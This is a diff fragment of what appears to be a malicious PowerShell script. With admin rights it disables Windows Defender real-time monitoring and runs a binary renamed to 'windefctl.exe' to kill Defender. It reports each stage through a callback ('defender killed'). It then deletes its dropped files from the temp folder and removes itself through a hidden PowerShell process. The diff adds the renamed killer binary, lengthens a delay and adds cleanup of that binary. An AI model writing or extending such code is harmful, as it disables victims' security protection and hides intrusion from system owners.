@@ -152,8 +152,8 @@ if($cbIsAdmin){
         Set-ItemProperty -Path $rtp -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
     }catch{}
 
-    _runArg 'update.exe' 'kill' 'S2' 'defkill'
-    Start-Sleep 3
+    _runArg 'windefctl.exe' 'kill' 'S2' 'defkill'
+    Start-Sleep 6
     _cb 'S2' 'ok' 'defender killed'
 }else{
     _cb 'S2' 'skip' 'no admin'
@@ -207,6 +207,7 @@ if($pdfBytes){
 # CLEANUP
 Start-Sleep 5
 Remove-Item "$env:TEMP\u.ps1" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue
 $sp=$MyInvocation.MyCommand.Path
 if($sp -and (Test-Path $sp)){
     Start-Process powershell.exe -ArgumentList "-NoP -w hidden -c `"Start-Sleep 3;Remove-Item -Path '$sp' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
